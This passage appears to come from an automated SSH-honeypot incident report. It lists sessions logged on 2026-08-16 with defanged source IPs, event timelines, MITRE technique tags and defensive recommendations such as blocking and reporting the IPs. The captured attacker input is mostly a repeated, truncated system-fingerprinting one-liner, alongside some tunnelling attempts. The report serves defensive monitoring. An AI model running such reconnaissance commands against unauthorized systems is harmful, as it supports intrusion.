| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:36:00` | `cowrie.session.connect` |
| `2026-08-16 01:36:01` | `cowrie.client.version` |
| `2026-08-16 01:36:01` | `cowrie.client.kex` |
| `2026-08-16 01:36:08` | `cowrie.login.success` |
| `2026-08-16 01:36:11` | `cowrie.session.params` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.success` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:11` | `cowrie.command.input` |
| `2026-08-16 01:36:12` | `cowrie.log.closed` |
| `2026-08-16 01:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d4d0189a95

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 01:36 |
| **Last Seen** | 2026-08-16 01:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:36:29` | `cowrie.session.connect` |
| `2026-08-16 01:36:29` | `cowrie.client.version` |
| `2026-08-16 01:36:29` | `cowrie.client.kex` |
| `2026-08-16 01:36:30` | `cowrie.login.success` |
| `2026-08-16 01:36:31` | `cowrie.session.params` |
| `2026-08-16 01:36:31` | `cowrie.command.input` |
| `2026-08-16 01:36:31` | `cowrie.log.closed` |
| `2026-08-16 01:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2969033baa

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:37 |
| **Last Seen** | 2026-08-16 01:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:37:04` | `cowrie.session.connect` |
| `2026-08-16 01:37:05` | `cowrie.client.version` |
| `2026-08-16 01:37:05` | `cowrie.client.kex` |
| `2026-08-16 01:37:09` | `cowrie.login.success` |
| `2026-08-16 01:37:12` | `cowrie.session.params` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.success` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:12` | `cowrie.command.input` |
| `2026-08-16 01:37:13` | `cowrie.log.closed` |
| `2026-08-16 01:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f35508f17c5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:38 |
| **Last Seen** | 2026-08-16 01:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:38:09` | `cowrie.session.connect` |
| `2026-08-16 01:38:10` | `cowrie.client.version` |
| `2026-08-16 01:38:10` | `cowrie.client.kex` |
| `2026-08-16 01:38:15` | `cowrie.login.success` |
| `2026-08-16 01:38:18` | `cowrie.session.params` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.success` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:18` | `cowrie.command.input` |
| `2026-08-16 01:38:20` | `cowrie.log.closed` |
| `2026-08-16 01:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba31137acbe2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:39 |
| **Last Seen** | 2026-08-16 01:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:39:14` | `cowrie.session.connect` |
| `2026-08-16 01:39:15` | `cowrie.client.version` |
| `2026-08-16 01:39:15` | `cowrie.client.kex` |
| `2026-08-16 01:39:21` | `cowrie.login.success` |
| `2026-08-16 01:39:24` | `cowrie.session.params` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.success` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:24` | `cowrie.command.input` |
| `2026-08-16 01:39:25` | `cowrie.log.closed` |
| `2026-08-16 01:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4dbeca7c963

| Field | Detail |
|---|---|
| **Source IP** | `112.25.140[.]211` |
| **First Seen** | 2026-08-16 01:39 |
| **Last Seen** | 2026-08-16 01:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:39:28` | `cowrie.session.connect` |
| `2026-08-16 01:39:29` | `cowrie.client.version` |
| `2026-08-16 01:39:29` | `cowrie.client.kex` |
| `2026-08-16 01:39:32` | `cowrie.login.success` |
| `2026-08-16 01:39:33` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.25.140[.]211` to AbuseIPDB if not already reported
- [ ] Block `112.25.140[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4dcf621d443

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-08-16 01:39 |
| **Last Seen** | 2026-08-16 01:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:39:39` | `cowrie.session.connect` |
| `2026-08-16 01:39:40` | `cowrie.client.version` |
| `2026-08-16 01:39:40` | `cowrie.client.kex` |
| `2026-08-16 01:39:42` | `cowrie.login.success` |
| `2026-08-16 01:39:42` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22102551f96

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:40 |
| **Last Seen** | 2026-08-16 01:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:40:20` | `cowrie.session.connect` |
| `2026-08-16 01:40:21` | `cowrie.client.version` |
| `2026-08-16 01:40:21` | `cowrie.client.kex` |
| `2026-08-16 01:40:25` | `cowrie.login.success` |
| `2026-08-16 01:40:28` | `cowrie.session.params` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.success` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:28` | `cowrie.command.input` |
| `2026-08-16 01:40:29` | `cowrie.log.closed` |
| `2026-08-16 01:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c067fcb70258

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:41 |
| **Last Seen** | 2026-08-16 01:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:41:26` | `cowrie.session.connect` |
| `2026-08-16 01:41:28` | `cowrie.client.version` |
| `2026-08-16 01:41:28` | `cowrie.client.kex` |
| `2026-08-16 01:41:32` | `cowrie.login.success` |
| `2026-08-16 01:41:36` | `cowrie.session.params` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.success` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:36` | `cowrie.command.input` |
| `2026-08-16 01:41:37` | `cowrie.log.closed` |
| `2026-08-16 01:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bada509fec79

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 01:42 |
| **Last Seen** | 2026-08-16 01:43 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:42:26` | `cowrie.session.connect` |
| `2026-08-16 01:42:31` | `cowrie.client.version` |
| `2026-08-16 01:42:31` | `cowrie.client.kex` |
| `2026-08-16 01:42:55` | `cowrie.login.success` |
| `2026-08-16 01:43:07` | `cowrie.session.params` |
| `2026-08-16 01:43:07` | `cowrie.command.input` |
| `2026-08-16 01:43:14` | `cowrie.log.closed` |
| `2026-08-16 01:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07012ea21e13

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:42 |
| **Last Seen** | 2026-08-16 01:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:42:32` | `cowrie.session.connect` |
| `2026-08-16 01:42:34` | `cowrie.client.version` |
| `2026-08-16 01:42:34` | `cowrie.client.kex` |
| `2026-08-16 01:42:39` | `cowrie.login.success` |
| `2026-08-16 01:42:42` | `cowrie.session.params` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.success` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:42` | `cowrie.command.input` |
| `2026-08-16 01:42:43` | `cowrie.log.closed` |
| `2026-08-16 01:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794070a55159

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:43 |
| **Last Seen** | 2026-08-16 01:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:43:43` | `cowrie.session.connect` |
| `2026-08-16 01:43:44` | `cowrie.client.version` |
| `2026-08-16 01:43:44` | `cowrie.client.kex` |
| `2026-08-16 01:43:50` | `cowrie.login.success` |
| `2026-08-16 01:43:53` | `cowrie.session.params` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.success` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:53` | `cowrie.command.input` |
| `2026-08-16 01:43:55` | `cowrie.log.closed` |
| `2026-08-16 01:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac13bd05e70

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:44 |
| **Last Seen** | 2026-08-16 01:45 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:44:47` | `cowrie.session.connect` |
| `2026-08-16 01:44:48` | `cowrie.client.version` |
| `2026-08-16 01:44:52` | `cowrie.client.kex` |
| `2026-08-16 01:44:58` | `cowrie.login.success` |
| `2026-08-16 01:45:01` | `cowrie.session.params` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.success` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:01` | `cowrie.command.input` |
| `2026-08-16 01:45:03` | `cowrie.log.closed` |
| `2026-08-16 01:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f26861e944

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:45 |
| **Last Seen** | 2026-08-16 01:46 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:45:48` | `cowrie.session.connect` |
| `2026-08-16 01:45:49` | `cowrie.client.version` |
| `2026-08-16 01:45:49` | `cowrie.client.kex` |
| `2026-08-16 01:45:55` | `cowrie.login.success` |
| `2026-08-16 01:45:58` | `cowrie.session.params` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.success` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:58` | `cowrie.command.input` |
| `2026-08-16 01:45:59` | `cowrie.log.closed` |
| `2026-08-16 01:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1172aecf9954

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:46 |
| **Last Seen** | 2026-08-16 01:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
